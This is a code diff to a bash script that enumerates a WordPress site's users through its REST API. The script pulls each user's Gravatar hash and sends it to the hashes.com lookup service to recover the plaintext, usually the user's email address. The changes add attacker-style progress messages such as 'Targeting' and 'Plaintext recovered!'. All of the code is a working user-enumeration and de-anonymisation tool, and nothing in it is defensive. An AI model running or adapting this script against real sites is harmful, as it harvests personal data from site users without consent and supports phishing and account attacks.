@@ -53,39 +53,63 @@ lookup_hash() {
 
 CLEAN_DOMAIN=$(echo "$DOMAIN" | sed 's|^https\?://||')
 
+echo "[+] Targeting: $CLEAN_DOMAIN" >&2
+
 BASE_URL="https://$CLEAN_DOMAIN"
+echo "[+] Trying HTTPS..." >&2
 if ! test_url "$BASE_URL"; then
-  # fall back to http
+  echo "[-] HTTPS failed, falling back to HTTP..." >&2
   BASE_URL="http://$CLEAN_DOMAIN"
   if ! test_url "$BASE_URL"; then
+    echo "[-] Unable to access WordPress API" >&2
     echo '{"error": "Unable to access WordPress API"}' >&2
     rm -f /tmp/wp_response.json
     exit 1
   fi
 fi
 
+echo "[+] WordPress API accessible at $BASE_URL" >&2
+
+USER_COUNT=$(jq '. | length' /tmp/wp_response.json)
+echo "[+] Found $USER_COUNT user(s)" >&2
+echo "[+] Extracting Gravatar hashes and looking up plaintexts..." >&2
+
+CURRENT=0
 {
   jq -c '.[]' /tmp/wp_response.json | while read -r user; do
+    CURRENT=$((CURRENT + 1))
     username=$(echo "$user" | jq -r '.name')
     slug=$(echo "$user" | jq -r '.slug')
     avatar_24=$(echo "$user" | jq -r '.avatar_urls."24" // empty')
+
+    echo "[+] Processing user $CURRENT/$USER_COUNT: $slug" >&2
 
     if [ -n "$avatar_24" ]; then
       hash=$(echo "$avatar_24" | grep -oP 'avatar/\K[a-f0-9]{64}')
 
       if [ -n "$hash" ]; then
+        echo "[+]   Hash found: ${hash:0:16}..." >&2
+        echo "[+]   Querying hashes.com API..." >&2
         plaintext=$(lookup_hash "$hash")
+        if [ "$plaintext" != "not_found" ]; then
+          echo "[+]   Plaintext recovered!" >&2
+        else
+          echo "[-]   Plaintext not found in database" >&2
+        fi
         jq -n --arg user "$username" --arg slug "$slug" --arg hash "$hash" --arg plaintext "$plaintext" \
           '{user: $user, username: $slug, hash: $hash, plaintext: $plaintext}'
       else
+        echo "[-]   No hash in avatar URL" >&2
         jq -n --arg user "$username" --arg slug "$slug" \
           '{user: $user, username: $slug, hash: "not_found", plaintext: "not_found"}'
       fi
     else
+      echo "[-]   No avatar URL available" >&2
       jq -n --arg user "$username" --arg slug "$slug" \
         '{user: $user, username: $slug, hash: "no_avatar", plaintext: "no_avatar"}'
     fi
   done
 } | jq -s '.'
 
+echo "[+] Done!" >&2
 rm -f /tmp/wp_response.json
